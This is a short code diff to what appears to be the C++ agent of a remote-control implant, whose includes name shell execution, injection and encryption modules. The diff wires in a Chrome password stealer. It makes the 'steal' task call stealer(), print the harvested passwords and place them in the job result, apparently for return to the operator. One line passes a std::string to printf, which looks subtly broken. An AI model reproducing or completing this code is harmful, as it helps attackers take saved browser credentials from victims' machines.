@@ -8,6 +8,7 @@
 #include "exec_shell.h"
 #include "aes_gcm.h"
 #include "inject.h"
+#include "../stealer/chrome.cpp"
 #include "nlohmann/json.hpp"
 
 using json = nlohmann::json;
@@ -218,14 +219,15 @@ void executeTasks(std::vector<json> tasks) {
 
             std::cout << response << std::endl << std::endl;
         } else if (task["command_type"] == "steal") {
-            std::cout << "steal some passwords (placeholder)" << std::endl;
-            // add implementation here
+            std::string result = stealer();
+
+            printf("user passwords: \n %s", result);
 
             json jsonResult = {
                 {"job_id", task["job_id"]},
                 {"agent_id", agentId},
                 {"password", password},
-                {"results", ""}
+                {"results", result}
             };
 
             std::string jsonString = jsonResult.dump();
